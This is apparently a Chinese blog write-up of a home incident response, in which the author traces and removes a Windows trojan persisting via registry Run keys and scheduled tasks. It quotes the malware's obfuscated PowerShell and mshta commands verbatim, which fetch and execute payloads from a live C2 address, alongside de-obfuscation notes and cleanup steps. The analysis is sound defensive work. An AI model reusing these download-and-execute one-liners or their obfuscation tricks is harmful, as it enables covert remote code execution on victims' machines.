---
title: 我情人节收到的第一个礼物居然是木马。
url: https://mp.weixin.qq.com/s/EvpI4ka8dI1f5NNdCq71VQ
source: Doonsec's feed
date: 2026-02-14
fetch_date: 2026-02-15T04:19:51.794074
---

# 我情人节收到的第一个礼物居然是木马。

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NP0zaFUZO5CXKxsVCBRhWGKagxYcyk2QI92oQUTsPx4L4PzdyqDpBa67cwxdecmjM1dMB2CPmElrfHLv6rl3XQyBshrJ56dSDzAOseUeSBM/0?wx_fmt=jpeg)

# 我情人节收到的第一个礼物居然是木马。

原创

1ceLAND
1ceLAND

XNL Coding

![]()

在小说阅读器中沉浸阅读

214-记一次Win木马应急响应

# 214 初见端倪

情人节，突然发现自己的电脑开始弹弹窗，而且弹了好几天：

```
C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/NP0zaFUZO5AUiccpMZTScsG3n2pYJHojT1tKe4oslJLb6F7NZhIu7haIobYKTfCWxUoVuyMgCo38TVFKnQ1sU3feoHSCKJiazfOAI2bT4ESLo/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5BcUY0quAyrKcosnUKbxY7icfsFM13s1dTnpLoub0RWticia7Me0GGsJVHqcV8EicxxibAhDXYohcLq4WqrPvwmeSo2WibXUnblIGgC8/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5CZ281XBAgAm4hsfTzqLDibF0lQWb5tW6Bj0qIiapphVOXCcnfWOibYlAaqkIqFXyI7mYeO7xwBribCOriarmo3vvb5lMzf9diaszwf0/640?wx_fmt=png&from=appmsg)

一开始不知道这个是什么，觉得这个 SysWOW64 好奇怪，但是后面我去上网搜了过后全部都显示：“SysWOW 是木马病毒？其实并非，删除了反而有坏处”。你继续。

# 定时任务中的恶意命令

打开了事件查看器，发现：

```
C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
-NoProfile -WindowStyle Hidden -Command "sal -Name SyncedUpdates -Value C:\WINDOWS\System32\AsUserUpTask; .(gal ?rm) 45.2853202/taskevent | .('PSBiePSBx'.Replace('PSB', ''))"
```

我注意到系统中存在异常的 PowerShell 隐藏执行行为——命令行带有 -NoProfile - WindowStyle Hidden 参数，并且包含 irm | iex （从远程服务器拉取代码并立即执行）。这明显不是正常软件的行为。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NP0zaFUZO5DUnYPibjH0XibWqvD5COzok0pyjtv1179AF25he1ickIBSFCsIEHVH9Jh6c79uTtaFziceu7Csk7RLYrr546rxNRYia68U5DSYUricM/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NP0zaFUZO5BEibIMFg5affWYia1vLxVicxmALWTWh2KVgwcC3h6V6OXYnkfjY5icgQq9mETgG4muDiaKBSPksfAhtoSeJZzoL2TRuAO4jMv4f4co/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NP0zaFUZO5ARwib5iaoO3yiaPaAlgc9HeqYRqwaT8KyyRld9UnxjibnbMbO3g9GWic2pDFPXkkKvO5ly7fO4DPGm6PQXicGVuVIb0cr5x0wL4EA1o/640?wx_fmt=jpeg&from=appmsg)

**这忍不了一点，赶紧把电脑救回来啊！！！！我不行了！**

# 初步排查：发现 Powershell 后门

## 1. 注册表启动项

检查 HKCU\Software\Microsoft\Windows\CurrentVersion\Run ，发现 3 条*恶意启动项*：

```
SansSerif powershell -NoP -Exec Bypass -W Hidden -C "iex(irm 0x2D.0x2B.0x89.0x52/dashboard)" WindowsPowerShell_v1.0G

C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -Command ".(gal ?rm) 0x2D.0x2B.0x89.0x52/regevent | .('RGLieRGLx'.Replace('RGL', ''))" User License Monitor G

C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoProfile -WindowStyle Hidden -Command "while(True){ if(-not(Get-Process -Name aspnet_wp -EA 0)){ .('WDieWDx'.Replace('WD', '')) (.(gal ?rm) 45.2853202/watchdog)} Start-Sleep 1800}"
```

1. IP 混淆： 0x2D.0x2B.0x89.0x52 是十六进制点分格式，Windows 会自动解析为 45.43.137.82 。另一处使 用十进制合并写法 45.2853202 ，同样解析为 45.43.137.82 。这是一种规避 IP 黑名单检测的常见技巧。
2. 命令混淆： .(gal ?rm) 等价于 Invoke-RestMethod （ gal 是 Get-Alias ， ?rm 匹配 irm ）。 'RGLieRGLx'.Replace('RGL', '') 拼出 iex （ Invoke-Expression ）。各端点使用不同的字符 串替换模式来隐藏 iex 。
3. 守护机制： User License Monitor G 这条极为狡猾——它是一个无限循环，每 30 分钟检查 aspnet\_wp.exe 进程是否存活，如果进程不存在就重新拉取并执行载荷。这意味着即使你杀掉了恶意进程， 30 分钟后它又会复活。

## 2. 恶意计划任务

通过 Get-ScheduledTask 筛查所有任务的 Actions，找到一条*可疑计划任务*：

```
任务名:        \SyncedAsUserUpdatesTaskG
执行程序:      C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
参数:          -NoProfile -WindowStyle Hidden -Command "sal -Name SyncedUpdates
               -Value C:\WINDOWS\System32\AsUserUpTask;
               .(gal ?rm) 45.2853202/taskevent | .('PSBiePSBx'.Replace('PSB', ''))"
注释:          This task automatically manages updates for the users and the machine,
               enabling enrollment, roaming and other services.
上次运行时间:   2026/2/14 0:42:22
上次结果:      0xC000013A（进程被终止）
```

注释伪装成 Windows 系统更新任务的口吻，命令行中还用 `sal` 创建了一个指向 `C:\WINDOWS\System32\AsUserUpTask` 的别名来增加迷惑性。 至此，确认存在 4 条持久化路径，全部指向同一个 C2 服务器 `45.43.137.82` 的不同端点。

# 溯源 C2：载荷获取与解密

我们来看看 C2 到底返回了什么。。。 这里我用 AI 来辅助清除电脑中的木马：（AI 宝宝太棒了👍👍👍）

## 载荷获取

使用 Invoke-WebRequest 逐一请求 4 个端点，全部返回 HTTP 200，每个载荷约 12MB：

| 端点 | 原始大小 |
| --- | --- |
| /dashboard | 11,863,748 bytes |
| /regevent | 12,442,172 bytes |
| /taskevent | 12,442,171 bytes |
| /watchdog | 11,864,116 bytes |

12MB 的 PowerShell 脚本？打开一看，满屏都是这样的东西：

```
${Get-Volume -Append -ComputerName $computerName && ($rhsgte)} = "some_value"
${Set-NetRoute -Minimal -Cleanup $routeData || ($drgarg12)} = "another_value"
```

变量名伪装成 PowerShell cmdlet 调用，夹杂着无意义的 for/while 循环和假赋值——纯粹的垃圾代码填充，目的是**把真正的载荷淹没在噪音中。**

## XOR 解密

在垃圾代码中找到了真正的执行逻辑：

1. 加密数据存储在 `[Byte[]]$useByteArray` 中（ASCII 编码的 Base64 字符）
2. 使用名为 `reduceShowData` 的函数解密
3. XOR 密钥：`u87hb5eg5g`（4 个端点完全相同）
4. 解密流程：字节数组 → UTF-8 字符串 → Base64 解码 → XOR 异或 解密后得到约 2.7-2.9MB 的 PowerShell 明文脚本。 顺带一提，脚本中还有一条诱饵执行路径——把分散在假变量中的 Base64 片段拼接解码后执行，实际产出的只是一个无害的 `Get-ConsoleColor` 函数。这是典型的红鲱鱼手法，专门用来迷惑分析人员。

## 深入分析

> “
>
> 这里直接涉及到知识盲区了。具体的分析太多，就不放在这里了。我一直在哭。
>
> ”

## Shellcode

4 个端点共投递了 3 个不同的 shellcode：

| 端点 | Shellcode 大小 |
| --- | --- |
| /dashboard | 654,361 bytes |
| /regevent | 686,943 bytes |
| /taskevent | 686,943 bytes（与 regevent 完全相同） |
| /watchdog | 654,361 bytes（与 dashboard 大小相同但内容不同） |

由于 shellcode 最终载荷需要沙箱进一步分析，类型暂未确定。结合攻击手法判断，最可能是 RAT（远控木马） 或 Stealer（信息窃取器）。

# 🧹第一轮清理

## 清除持久化

```
# 删除 3 条恶意 Run 键
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
     -Name "SansSerif", "WindowsPowerShell_v1.0G", "User License Monitor G"
```

```
# 删除恶意计划任务
Unregister-ScheduledTask -TaskName "SyncedAsUserUpdatesTaskG" -Confirm:$false
```

## 清除恶意文件

```
# 删除 3 处 TaskHostProfiles 目录
Remove-Item -Recurse -Force "C:\ProgramData\TaskHostProfiles"
Remove-Item -Recurse -Force "C:\Users\NoneIceland\TaskHostProfiles"
Remove-Item -Recurse -Force "C:\Users\NoneIceland\AppData\Roaming\TaskHostProfiles"

# usermodetm.dll 手动删除（我全局搜找到了哈哈哈）
```

## 阻断 C2 通信

```
 netsh advfirewall firewall add rule name="Block C2" dir=out action=block remoteip=45.43.137.82
```

首轮验证

* Run 键中 3 条恶意项已不存在
* 计划任务 SyncedAsUserUpdatesTaskG 已不存在
* aspnet\_wp.exe、AddInProcess.exe、InstallUtil.exe 均未运行
* 3 处 TaskHostProfiles 目录已删除
* usermodetm.dll 已删除

以为终于结束了。哈哈哈。

# 🧹 第二轮清理

清理完成后不久，屏幕上突然弹出一个白色窗口，地址栏显示 https://s3-python.cc/，几秒后自动消失。

我真的崩溃了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NP0zaFUZO5DI5BSX3MLSyPyXvLC2cicWjZWO61lic2tUoGvYIdTfaKhKwgz2tluvQ1L3xVGQzjgAKzZMib468hicIuzrMwm53cIENAictVUCjZBE/640?wx_fmt=png&from=appmsg)

## 发现 NVIDIA 伪装任务

重新扫描计划任务，这次找到了一条之前没注意到的任务：

```
NVIDIA App SelfUpdate_{DDD0-F920-D4CF-1C26-447B2893E549C83}
```

看名字像是 NVIDIA 显卡驱动的自动更新——但实际执行的是：

```
mshta.exe https://s3-python.cc
```

**mshta.exe** 是 Windows 自带的 HTML Application Host，可以直接从远程 URL 加载并执行 HTA 文件。这是另一个经典的 LOLBin 滥用。

### 任务详细配置

```
 <TimeTrigger>
     <StartBoundary>2026-02-07T11:09:00</StartBoundary>
     <Repetition>
         <Interval>PT30M</Interval>      <!-- 每 30 分钟执行一次 -->
         <Duration>P760D</Duration>       <!-- 持续 760 天（≈2 年） -->
     </Repetition>
 </TimeTrigger>
 <Settings>
     <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>     <!-- 1 分钟后自动终止 -->
     <WakeToRun>true</WakeToRun>                       <!-- 甚至会唤醒休眠的电脑 -->
     <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
 </Settings>
```

几个"亮"点：（）还亮点你满意了吗：

* 760 天持续期：攻击者规划了长达 2 年的持久化
* WakeToRun=true：即使电脑休眠也会被唤醒执行，比 C2-1 的 PowerShell 路线更激进
* ExecutionTimeLimit=PT1M：这就是为什么白窗口"弹出来一会就消失了"——mshta 进程被计划任务在 1 分钟后强制终止
* 每 30 分钟执行：高频回连

## 清除 C2-2

### 导出 XML 证据

```
Export-ScheduledTask -TaskName "NVIDIA App SelfUpdate_{DDD0-F920-D4CF-1C26-447B2893E549C83}" |
     Out-File nvidia_fake_task.xml
```

### 删除任务

```
Unregister-ScheduledTask -TaskName "NVIDIA App SelfUpdate_{DDD0-F920-D4CF-1C26-447B2893E549C83}" -Confirm:$false
```

### 验证 mshta.exe 未运行

```
Get-Process mshta -EA 0  # 无结果
```

### 阻断 C2-2 出站

```
netsh advfirewall firewall add rule name="Block C2 s3-python.cc" dir=out action=block remoteip=176.65.132.117
```

尝试获取 C2-2 的 HTA 载荷进行分析，但 s3-python.cc 的 HTTPS 连接已无法建立（SSL 错误，服务器无响应），载荷内容未能获取。这也解释了白窗口弹出后显示空白页面——mshta 发起了 HTTPS 请求但拿不到内容。

# 全面扫描与最终验证

两轮清理完成后，进行了全面的系统扫描, **所有已知恶意组件已完全清除。**

# 感染原因推测

> “
>
> 其实是 2 月 7 日 不小心下载了一个汉化版...